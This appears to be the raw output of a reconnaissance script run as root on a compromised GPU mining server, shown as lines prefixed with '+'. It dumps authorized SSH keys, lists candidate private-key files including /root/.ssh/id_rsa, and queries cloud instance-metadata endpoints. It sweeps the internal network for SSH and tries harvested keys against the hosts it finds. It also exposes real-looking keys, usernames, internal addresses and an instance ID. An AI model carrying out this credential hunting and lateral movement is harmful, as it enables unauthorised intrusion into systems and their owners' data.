+-rwxr-xr-x  1 root   root         427 Nov 24 03:47 boot_wr.sh.orig
+-rw-r--r--  1 root   root      599922 Nov 25 00:48 g0.log
+-rw-r--r--  1 root   root      599622 Nov 25 00:48 g1.log
+-rw-r--r--  1 root   root      599211 Nov 25 00:48 g2.log
+-rw-r--r--  1 root   root      600216 Nov 25 00:48 g3.log
+-rw-r--r--  1 root   root      599848 Nov 25 00:48 g4.log
+-rw-r--r--  1 root   root      600475 Nov 25 00:48 g5.log
+-rw-r--r--  1 root   root      599488 Nov 25 00:48 g6.log
+-rw-r--r--  1 root   root      600588 Nov 25 00:48 g7.log
+-rw-r--r--  1 vendor vendor      6423 Jun  9  2025 help.txt
+-rw-r--r--  1 root   root         669 Nov 25 03:45 k466.txt
+-rwxr-xr-x  1 root   root         657 Nov 24 05:03 keep.sh
+-rw-r--r--  1 root   root    29729454 Nov 24 14:11 kit.tgz
+drwxr-xr-x  2 root   root        4096 Nov 24 02:14 krig
+-rw-r--r--  1 root   root   119697919 Nov 24 02:14 krig.tar.gz
+-rwxr-xr-x  1 root   root        1146 Nov 24 02:13 krig_dl.sh
+drwxr-xr-x  2 root   root        4096 Nov 24 05:00 log
+-rw-r--r--  1 root   root         312 Nov 24 07:00 p2.sh
+-rw-r--r--  1 root   root         263 Nov 23 21:16 plant.log
+-rw-r--r--  1 root   root         774 Nov 24 04:53 q.txt
+-rw-r--r--  1 vendor vendor       234 Feb  7  2019 readme.txt
+-rw-r--r--  1 root   root        9161 Nov 24 13:29 recon929.out
+-rw-r--r--  1 root   root        1677 Nov 24 13:25 recon929.sh
+-rwxr-xr-x  1 root   root         936 Nov 24 04:53 relaunch_qwen.sh
+-rwxr-xr-x  1 root   root        2206 Nov 25 02:46 relay.py
+-rwxr-xr-x  1 root   root        2206 Nov 24 02:08 relay.py.orig
+-rw-r--r--  1 vendor vendor       184 Nov 10  2023 start-BitCore-zergpool.com.sh
+-rw-r--r--  1 vendor vendor       181 Nov 10  2023 start-BitCore-zpool.ca.sh
+-rw-r--r--  1 vendor vendor       165 Apr 10  2025 start-Evrmore.sh
+-rw-r--r--  1 vendor vendor       167 Aug  7  2024 start-Meowcoin.sh
+-rw-r--r--  1 vendor vendor       166 Nov 10  2023 start-Neoxa.sh
+-rw-r--r--  1 vendor vendor       183 Nov 10  2023 start-Nexa.sh
+-rw-r--r--  1 vendor vendor       188 Aug 25 19:51 start-Pearl.sh
+-rw-r--r--  1 vendor vendor       176 Aug  6  2025 start-Qubitcoin-luckypool.io.sh
+-rw-r--r--  1 vendor vendor       157 Sep 24  2025 start-Qubitcoin-rplant.xyz.sh
+-rw-r--r--  1 vendor vendor       169 Sep 24  2025 start-Qubitcoin-suprnova.cc.sh
+-rw-r--r--  1 vendor vendor       148 Nov 10  2023 start-Radiant.sh
+-rw-r--r--  1 vendor vendor       183 Nov 10  2023 start-Radiant_lockMemory.sh
+-rw-r--r--  1 vendor vendor       172 Nov 10  2023 start-Raptoreum.sh
+-rw-r--r--  1 vendor vendor       176 Nov 10  2023 start-Ravencoin.sh
+-rw-r--r--  1 vendor vendor       279 Nov 10  2023 start-Sero.sh
+-rw-r--r--  1 vendor vendor       169 Nov 10  2023 start-SkyDoge.sh
+-rw-r--r--  1 vendor vendor       175 Aug  6  2024 start-TelestAI.sh
+-rw-r--r--  1 vendor vendor       243 Nov 10  2023 start-Zano.sh
+-rw-r--r--  1 vendor vendor       114 Oct 17  2025 start.sh
+-rw-r--r--  1 vendor vendor       241 Nov 10  2023 start_apply_OC.sh
+-rw-r--r--  1 root   root          35 Nov 23 21:16 status.txt
+-rw-r--r--  1 root   root        1594 Nov 24 04:26 stprobe.py
+-rwxr-xr-x  1 root   root         657 Nov 24 05:00 sup.sh
+-rwxr-xr-x  1 root   root         880 Nov 24 05:09 sup2.sh
+-rw-r--r--  1 root   root         786 Nov 24 04:00 sw.py
+-rw-r--r--  1 root   root        2135 Nov 24 09:51 sw2.out
+-rw-r--r--  1 root   root         864 Nov 24 04:43 t19relay3.sh
+-rwxr-xr-x  1 vendor vendor  29725148 Nov 14 19:38 wildrig-multi.orig
+-rw-r--r--  1 root   root    29733006 Nov 23 21:35 wr.tgz
+drwxr-xr-x  3 root   root        4096 Nov 25 02:42 www
+
+### AUTHKEYS
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+AyHs+lkIc1fwCLn2tf2c/H8khg8kt5rloPTJZekmiCp8W05BdHuM6AbRCtGXll0RGT7ou5oYJiHPKBvxrgPgU1op5q051/qxq/bv
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbhPuZru0Lp+J3SefCO7kSwhNfDhht+tvtXlxJexoHS root@bm-2209615
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA7OEQMwJ6mWp99EN4iRkvweA8yj+m9dx++WOVojWrhBxYaWpGVM549Y1979jp8wtgi7V9c/SmxZ32yLgx6bmTAvCYwWB3BU35q1l1YLsO
+
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBO9yFkKH67aT//SaZ2JO7pxogcWcx5MP0h8vQVtQkkO lizibin@MacPro.local
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEvWXxGqrYTVpReqyg+9BLV3I2MUHjxRP5SrYPDg30okI3JaqjNvl0Y//XwXt3AZLMfg2QTxgVn+dG36WYvmKPB9IU3RgTy56otYP+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDherIbzzsdfyoKdEMTtdhl+S7w+Ce/wDsz0J29VZ+0yP54IhtLupABsjNFbZzvld1//+iPwwuvLhWADNPnnD7GNy0phifxO4TkqhGW
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiKMVp8qC/RwdSfq5X2BoIKenekBAeyMZzKkNlZrHroSmtX+F0LrUsuaLzK4ZmlpWMmxpppA9AKzLlDM8c0ukUd+Iv12mstI7+mq6A
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyQrgH1OrWlOfxEwojhVtsd7Eo9R88HSQg4Fu2/MYFtj6SBdqc5GI3JVtaPQl3EJyCz/0fDv3MJmHEImtv8znvpR8UQr0xu6JRvYX8
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7s+scQVAXL4Z4jZSr6uI8AsknHMmxspEEFvMbQheH6M9owN64efNGMX/PavxLMkW90CFUR/0FGAQ8UfRUw+RAv+kIke5gE89mUKxH
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcmq6PYCyFYri6A+LhUlrSIj4F41JpKvTzU/9XYU2Fn t19
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm t19-key
+### PRIVKEYS
+/tmp/venv_test/lib/python3.12/site-packages/certifi/cacert.pem
+/etc/pki/fwupd/LVFS-CA.pem
+/etc/pki/fwupd-metadata/LVFS-CA.pem
+/etc/pollinate/entropy.ubuntu.com.pem
+/root/.local/share/uv/python/cpython-3.12.10-linux-x86_64-gnu/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+/root/.local/share/uv/python/cpython-3.12.3-linux-x86_64-gnu/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+/root/.ssh/id_rsa
+/opt/mineru-env/lib/python3.12/site-packages/grpc/_cython/_credentials/roots.pem
+/opt/mineru-env/lib/python3.12/site-packages/certifi/cacert.pem
+/opt/mineru-env/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+/opt/py/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+/opt/hosteye/bin/python2.7/site-packages/certifi/cacert.pem
+/opt/hosteye/lib/cert.pem
+/opt/bcm-agent/var/lib/bcm-agent/cert.pem
+/usr/src/linux-source-5.15.0/debian/canonical-revoked-certs.pem
+/usr/src/linux-source-5.15.0/debian/certs/canonical-livepatch-all.pem
+/usr/src/linux-source-5.15.0/debian/certs/ubuntu-drivers-all.pem
+/usr/src/linux-source-5.15.0/debian/canonical-certs.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2018-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-uc2019-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2021v1-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2021v3-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2019-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2021v2-all.pem
+/usr/src/linux-source-5.15.0/debian/revoked-certs/canonical-uefi-2012-all.pem
+### DATAAPPS
+ls: cannot access '/data/apps': No such file or directory
+ls: cannot access '/data/apps/conf': No such file or directory
+sed: can't read /data/apps/conf/hosts: No such file or directory
+### VENDORS
+total 100412
+drwxr-xr-x 8 root   root       4096 Nov  2 15:00 .
+drwxr-xr-x 4 root   root       4096 May 18  2026 ..
+-rw-r--r-- 1 root   root       2282 Aug 18 15:29 Dockerfile
+-rw-r--r-- 1 root   root       4684 Jun 18 10:57 docker-compose.yml
+drwxr-xr-x 8 root   root       4096 Oct 23 00:59 firefox
+-rw-r--r-- 1 root   root   93456084 Nov  2 14:35 firefox-159.0.tar.xz
+-rwxr-xr-x 1 vendor vendor  6029440 Jul 17 17:35 geckodriver
+-rw-r--r-- 1 root   root    2348355 Nov  2 14:59 geckodriver-v0.37.1-linux64.tar.gz
+-rw-r--r-- 1 root   root     927598 Aug  4 10:14 hardware.html
+drwxr-xr-x 6 root   root       4096 May 12  2026 mysql
+drwxr-xr-x 4 root   root       4096 Jun  3 15:20 nginx
+drwxr-xr-x 4 root   root       4096 May  7  2026 npa_server
+drwxr-xr-x 5 root   root       4096 May  7  2026 playwright_cache
+drwxr-xr-x 3 root   root       4096 May  7  2026 redis
+/ssd/vendors/INSPUR/mysql/data/auto.cnf
+/ssd/vendors/QD_ZRYY/ow_customer/.env
+/ssd/vendors/QD_GLAD/npa_bicm_bak/mysql_conf/my.cnf
+/ssd/vendors/QD_GLAD/npa_bicm_bak/mysql_data/auto.cnf
+### MYSQLCONF
+### IMDS
+-- http://169.254.169.254/latest/meta-data/instance-id
+18f5adda-6d6f-45db-a7a4-117faf33a8da
+-- http://169.254.169.254/latest/meta-data/
+ami-launch-index
+ami-manifest-path
+azone
+bbc-disk-mapping/
+block-device-location/
+block-device-mapping/
+block-device-type/
+create-time
+hostname
+image-id
+instance-action
+instance-id
+instance-name
+instance-shortid
+instance
+-- http://169.254.169.254/instance_identity/v1/token
+<html>
+ <head>
+  <title>404 Not Found</title>
+ </head>
+ <body>
+  <h1>404 Not Found</h1>
+  The resource could not be found.<br /><br />
+
+
+
+ </body>
+</html>
+-- http://100.100.100.200/latest/meta-data/
+
+-- http://169.254.169.254/openstack/latest/meta_data.json
+{"random_seed": "0aYutsPHfhR6wIFJdf+Nv1ZveDGBqJAZi0GiG0MqF+wHeVOI4YetXCqbjujVyIEA5doT6rfjfs1b3RrOANASfGXK+q6BRFkK09ps6YIiTHA8Pzdl6SY0BbhyLzcvOuM+3fiatKC53t6VTe/8ggxyFPcqZ3UumbN73PoPbWKoELBNnw0jj+3DWv1u5gfesVoO3lzSPG2pJXF
+-- http://metadata.google.internal/computeMetadata/v1/
+
+### SWEEP2
+OPEN 192.168.0.20 22
+OPEN 192.168.0.21 22
+OPEN 192.168.0.22 22
+OPEN 192.168.0.23 22
+OPEN 192.168.0.24 9400
+OPEN 192.168.0.28 22
+OPEN 192.168.0.28 9400
+OPEN 192.168.0.30 22
+OPEN 192.168.0.30 9400
+OPEN 192.168.0.31 22
+OPEN 192.168.0.31 9400
+### ROUTE-CHECK
+-- 10.242.32.6
+
+NO22 10.242.32.6
+-- 10.102.2.161
+
+NO22 10.102.2.161
+-- 10.251.10.107
+
+NO22 10.251.10.107
+-- 10.80.80.12
+
+NO22 10.80.80.12
+-- 172.16.21.2
+
+NO22 172.16.21.2
+-- 10.100.80.5
+
+NO22 10.100.80.5
+-- 49.235.160.237
+
+NO22 49.235.160.237
+### LADDER2
+KEYSET2: /tmp/venv_test/lib/python3.12/site-packages/certifi/cacert.pem
+/etc/pki/fwupd/LVFS-CA.pem
+/etc/pki/fwupd-metadata/LVFS-CA.pem
+/etc/pollinate/entropy.ubuntu.com.pem
+/root/.local/share/uv/python/cpython-3.12.10-linux-x86_64-gnu/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+/root/.local/share/uv/python/cpython-3.12.3-linux-x86_64-gnu/lib/python3.12/site-packages/pip/_vendor/certifi/cacert.pem
+192.168.0.20
+192.168.0.21
+192.168.0.22
+192.168.0.23
+192.168.0.28
+192.168.0.30
+192.168.0.31
+NOAUTH 192.168.0.20
+NOAUTH 192.168.0.21
+NOAUTH 192.168.0.22
+NOAUTH 192.168.0.28
+NOAUTH 192.168.0.30
+NOAUTH 192.168.0.31
+### ACCEPT2
+### BASELINE2
+### DONE2 2026-11-24T19:47:10Z
